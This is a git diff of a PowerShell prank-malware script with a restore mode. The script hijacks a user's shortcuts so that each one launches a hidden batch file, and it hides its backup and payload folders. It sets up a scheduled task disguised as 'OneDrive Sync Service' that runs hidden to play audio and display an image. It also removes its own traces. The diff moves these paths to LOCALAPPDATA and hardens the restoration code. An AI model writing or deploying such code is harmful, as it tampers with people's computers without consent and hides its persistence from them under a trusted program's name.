@@ -61,37 +61,37 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
     if($links.Count -ge 1){
         
         # Backup the links
-        New-Item -ItemType Directory "$env:USERPROFILE\Backup" -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "$env:USERPROFILE\Backup" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+        New-Item -ItemType Directory "$env:LOCALAPPDATA\Backup" -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "$env:LOCALAPPDATA\Backup" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
         $i=0
 
         foreach ($link in $links) {
-            if (!(Test-Path "$env:USERPROFILE\Backup\$i\$($link.Name)")) {
-                New-Item -ItemType Directory "$env:USERPROFILE\Backup\$i" -ErrorAction SilentlyContinue
-                Copy-Item $link.FullName "$env:USERPROFILE\Backup\$i" -ErrorAction SilentlyContinue
-                "$i;$($link.FullName)" | Out-File -Append "$env:USERPROFILE\Backup\links.db" -Encoding UTF8
+            if (!(Test-Path "$env:LOCALAPPDATA\Backup\$i\$($link.Name)")) {
+                New-Item -ItemType Directory "$env:LOCALAPPDATA\Backup\$i" -ErrorAction SilentlyContinue
+                Copy-Item $link.FullName "$env:LOCALAPPDATA\Backup\$i" -ErrorAction SilentlyContinue
+                "$i;$($link.FullName)" | Out-File -Append "$env:LOCALAPPDATA\Backup\links.db" -Encoding UTF8
                 $i++
             }
         }
 
         # Install the script
-        if (!(Test-Path "$env:USERPROFILE\Data")) {
-            New-Item -ItemType Directory "$env:USERPROFILE\Data" -ErrorAction SilentlyContinue
-            Set-ItemProperty -Path "$env:USERPROFILE\Data" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+        if (!(Test-Path "$env:LOCALAPPDATA\Data")) {
+            New-Item -ItemType Directory "$env:LOCALAPPDATA\Data" -ErrorAction SilentlyContinue
+            Set-ItemProperty -Path "$env:LOCALAPPDATA\Data" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
         }
-        if (!(Test-Path "$env:USERPROFILE\Data\image.png") -or !(Test-Path "$env:USERPROFILE\Data\audio.wav")) {
-            Expand-Archive -Path ".\src\data.zip" -DestinationPath "$env:USERPROFILE\Data\"
+        if (!(Test-Path "$env:LOCALAPPDATA\Data\image.png") -or !(Test-Path "$env:LOCALAPPDATA\Data\audio.wav")) {
+            Expand-Archive -Path ".\src\data.zip" -DestinationPath "$env:LOCALAPPDATA\Data\"
         }
-        if (!(Test-Path "$env:USERPROFILE\Data\MEGA_links.ps1")) {
-            Copy-Item ".\MEGA_links.ps1" "$env:USERPROFILE\Data\"
+        if (!(Test-Path "$env:LOCALAPPDATA\Data\MEGA_links.ps1")) {
+            Copy-Item ".\MEGA_links.ps1" "$env:LOCALAPPDATA\Data\"
         }
-        if (!(Test-Path "$env:USERPROFILE\Data\src\data.zip")) {
-            New-Item -ItemType Directory "$env:USERPROFILE\Data\src" -ErrorAction SilentlyContinue
-            Copy-Item ".\src\data.zip" "$env:USERPROFILE\Data\src"
+        if (!(Test-Path "$env:LOCALAPPDATA\Data\src\data.zip")) {
+            New-Item -ItemType Directory "$env:LOCALAPPDATA\Data\src" -ErrorAction SilentlyContinue
+            Copy-Item ".\src\data.zip" "$env:LOCALAPPDATA\Data\src"
         }
-        if (!(Test-Path "$env:USERPROFILE\Data\save_him_from_hell.bat")) {
-            Copy-Item ".\save_him_from_hell.bat" "$env:USERPROFILE\Data\"
+        if (!(Test-Path "$env:LOCALAPPDATA\Data\save_him_from_hell.bat")) {
+            Copy-Item ".\save_him_from_hell.bat" "$env:LOCALAPPDATA\Data\"
         }
 
         # Setup the mode
@@ -100,11 +100,11 @@ if ($mode -notin @("save_him_from_hell", "ah_shit..._here_we_go_again", "get_shr
 @"
 @echo off
 
-Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "save_him_from_hell"
+Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "save_him_from_hell"
 
-Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "get_shrekt"
+Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "get_shrekt"
 
-"@ | Out-File "$env:USERPROFILE\Data\run.bat" -Encoding UTF8
+"@ | Out-File "$env:LOCALAPPDATA\Data\run.bat" -Encoding UTF8
 
         }
 
@@ -114,11 +114,11 @@ Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "get_shrekt"
 @"
 @echo off
 
-Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "save_him_from_hell"
+Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "save_him_from_hell"
 
-"$env:USERPROFILE\Data\image.png"
+"$env:LOCALAPPDATA\Data\image.png"
 
-"@ | Out-File "$env:USERPROFILE\Data\run.bat" -Encoding UTF8
+"@ | Out-File "$env:LOCALAPPDATA\Data\run.bat" -Encoding UTF8
 
         }
 
@@ -128,11 +128,11 @@ Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "save_him_from_hell"
 @"
 @echo off
 
-Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "ah_shit..._here_we_go_again"
+Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "ah_shit..._here_we_go_again"
 
-Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "get_shrekt"
+Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "get_shrekt"
 
-"@ | Out-File "$env:USERPROFILE\Data\run.bat" -Encoding UTF8
+"@ | Out-File "$env:LOCALAPPDATA\Data\run.bat" -Encoding UTF8
 
         }
 
@@ -143,7 +143,7 @@ Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "get_shrekt"
         foreach ($link in $links) {
             $shortcut = $WshShell.CreateShortcut($link.FullName)
 
-            $shortcut.TargetPath = "$env:USERPROFILE\Data\run.bat"
+            $shortcut.TargetPath = "$env:LOCALAPPDATA\Data\run.bat"
             $shortcut.WindowStyle = 7
 
             $shortcut.Save()
@@ -154,68 +154,109 @@ Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "get_shrekt"
 
 } elseif ($mode -eq "save_him_from_hell"){
     
-    # Log the recovery (in case you get an error)
-    Start-Transcript "$env:USERPROFILE\Backup\Data_Recovery.log" -Append
+    Start-Transcript "$env:LOCALAPPDATA\Backup\Data_Recovery.log" -Append
 
-    # Restore where the links were
+    Write-Host "--- Starting Restoration Procedure ---" -ForegroundColor Cyan
+
+    # Loading the database
     $data = @{}
-
-    foreach ($raw in Get-Content "$env:USERPROFILE\Backup\links.db") {
-        $parts = $raw.Split(";",2)
-        $data[$parts[0]] = $parts[1]
+    if (Test-Path "$env:LOCALAPPDATA\Backup\links.db") {
+        foreach ($raw in Get-Content "$env:LOCALAPPDATA\Backup\links.db") {
+            $parts = $raw.Split(";",2)
+            if ($parts.Count -eq 2) { $data[$parts[0]] = $parts[1] }
+        }
+        Write-Host "[OK] Database loaded." -ForegroundColor Green
+    } else {
+        Write-Host "[!] links.db missing : Skipping file restoration phase." -ForegroundColor Yellow
     }
 
-    foreach ($id in $data.Keys) {
-        Move-Item "$env:USERPROFILE\Backup\$id\$(($data[$id]).Split("\")[-1])" $data[$id] -Force
+    # Restoring files (only executes if $data contains something)
+    if ($data.Count -gt 0) {
+        foreach ($id in $data.Keys) {
+            try {
+                $sourceDir = "$env:LOCALAPPDATA\Backup\$id"
+                if (Test-Path $sourceDir) {
+                    $sourceFile = Get-ChildItem $sourceDir | Select-Object -First 1
+                    if ($sourceFile) {
+                        Move-Item $sourceFile.FullName $data[$id] -Force -ErrorAction Stop
+                        Write-Host "[OK] Restored : $($data[$id])" -ForegroundColor Green
+                    }
+                }
+            } catch {
+                Write-Host "[ERROR] Failed to restore $id : $($_.Exception.Message)" -ForegroundColor Red
+            }
+        }
     }
 
-    Remove-Item "$env:USERPROFILE\Backup\links.db"
-    Remove-Item "$env:USERPROFILE\Data\src\data.zip"
-    Remove-Item "$env:USERPROFILE\Data\src"
-
-    foreach ($id in $data.Keys){
-        Remove-Item "$env:USERPROFILE\Backup\$id"
+    # Cleanup (Executes even if restoration failed)
+    Write-Host "Cleaning up traces..." -ForegroundColor Yellow
+    $toRemove = @(
+        "$env:LOCALAPPDATA\Backup\links.db",
+        "$env:LOCALAPPDATA\Data\src\data.zip",
+        "$env:LOCALAPPDATA\Data\src"
+    )
+    foreach ($path in $toRemove) {
+        if (Test-Path $path) { Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue }
     }
 
-    # Check if the scheduled task is installed, if it is delete it
+    # Cleaning up remaining ID folders
+    if ($data.Count -gt 0) {
+        foreach ($id in $data.Keys) {
+            $idPath = "$env:LOCALAPPDATA\Backup\$id"
+            if (Test-Path $idPath) {
+                # On vérifie s'il y a des fichiers à l'intérieur
+                $items = Get-ChildItem -Path $idPath
+                if ($items.Count -eq 0) {
+                    # Le dossier est vide, on peut supprimer sans crainte et sans popup
+                    Remove-Item $idPath -Confirm:$false -ErrorAction SilentlyContinue
+                    Write-Host "[OK] Backup folder removed : $id" -ForegroundColor Gray
+                } else {
+                    # Le dossier n'est pas vide, on affiche l'erreur sans appeler Remove-Item
+                    Write-Host "[ERROR] Failed to delete $idPath : Folder not empty (restoration failed?)" -ForegroundColor Red
+                }
+            }
+        }
+    }
+
+    # Scheduled task
     $taskName = "OneDrive Sync Service"
-
     if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
         Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+        Write-Host "[OK] Scheduled task removed." -ForegroundColor Green
     }
 
-    # Delete the script
-    Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"$env:USERPROFILE\Data\audio.wav`"" -WindowStyle Hidden
-    Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"$env:USERPROFILE\Data\image.png`"" -WindowStyle Hidden
-    Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"$env:USERPROFILE\Data\run.bat`"" -WindowStyle Hidden
-    Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"$env:USERPROFILE\Data\MEGA_links.ps1`"" -WindowStyle Hidden
-    Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"$env:USERPROFILE\Data\save_him_from_hell.bat`"" -WindowStyle Hidden
+    # File self-destruction (via CMD to allow script time to finish)
+    Write-Host "Deleting script files..." -ForegroundColor Yellow
+    $filesToDelete = "audio.wav", "image.png", "run.bat", "MEGA_links.ps1", "save_him_from_hell.bat"
+    foreach ($file in $filesToDelete) {
+        Start-Process cmd.exe -ArgumentList "/c timeout 5 & del `"$env:LOCALAPPDATA\Data\$file`"" -WindowStyle Hidden
+    }
 
-    # stop logging
+    Write-Host "--- Procedure completed ---" -ForegroundColor Cyan
+
     Stop-Transcript
-    
 
 } elseif ($mode -eq "ah_shit..._here_we_go_again") {
     
     # Log the recovery (in case you get an error)
-    Start-Transcript "$env:USERPROFILE\Backup\Data_Recovery.log" -Append
+    Start-Transcript "$env:LOCALAPPDATA\Backup\Data_Recovery.log" -Append
 
     # Restore where the links were
     $data = @{}
 
-    foreach ($raw in Get-Content "$env:USERPROFILE\Backup\links.db") {
+    foreach ($raw in Get-Content "$env:LOCALAPPDATA\Backup\links.db") {
         $parts = $raw.Split(";",2)
         $data[$parts[0]] = $parts[1]
     }
 
     foreach ($id in $data.Keys) {
-        Move-Item "$env:USERPROFILE\Backup\$id\$(($data[$id]).Split("\")[-1])" $data[$id] -Force
+        Move-Item "$env:LOCALAPPDATA\Backup\$id\$(($data[$id]).Split("\")[-1])" $data[$id] -Force
     }
 
-    Remove-Item "$env:USERPROFILE\Backup\links.db"
+    Remove-Item "$env:LOCALAPPDATA\Backup\links.db"
 
     foreach ($id in $data.Keys){
-        Remove-Item "$env:USERPROFILE\Backup\$id"
+        Remove-Item "$env:LOCALAPPDATA\Backup\$id"
     }
 
     # Stop logging
@@ -235,7 +276,7 @@ Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "get_shrekt"
     # Set the action of the task
     $action = New-ScheduledTaskAction `
         -Execute "powershell.exe" `
-        -Argument "-NoProfile -WindowStyle Hidden -File `"$env:USERPROFILE\Data\MEGA_links.ps1`" `"wtf_is_wrong_with_you`""
+        -Argument "-NoProfile -WindowStyle Hidden -File `"$env:LOCALAPPDATA\Data\MEGA_links.ps1`" `"wtf_is_wrong_with_you`""
 
     # Set the date/time execution of the task
     $trigger = New-ScheduledTaskTrigger -Once -At $randomDateTime
@@ -268,7 +309,7 @@ Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "get_shrekt"
     # -------------------------
     # AUDIO (in RAM)
     # -------------------------
-    $audioPath = "$env:USERPROFILE\Data\audio.wav"
+    $audioPath = "$env:LOCALAPPDATA\Data\audio.wav"
 
     $player = New-Object System.Media.SoundPlayer
     $player.SoundLocation = $audioPath
@@ -280,7 +321,7 @@ Powershell "$env:USERPROFILE\Data\MEGA_links.ps1" "get_shrekt"
     # -------------------------
     Add-Type -AssemblyName PresentationFramework
 
-    $imagePath = "$env:USERPROFILE\Data\image.png"
+    $imagePath = "$env:LOCALAPPDATA\Data\image.png"
     
     $bytes  = [System.IO.File]::ReadAllBytes($imagePath)
     $stream = New-Object System.IO.MemoryStream(,$bytes)
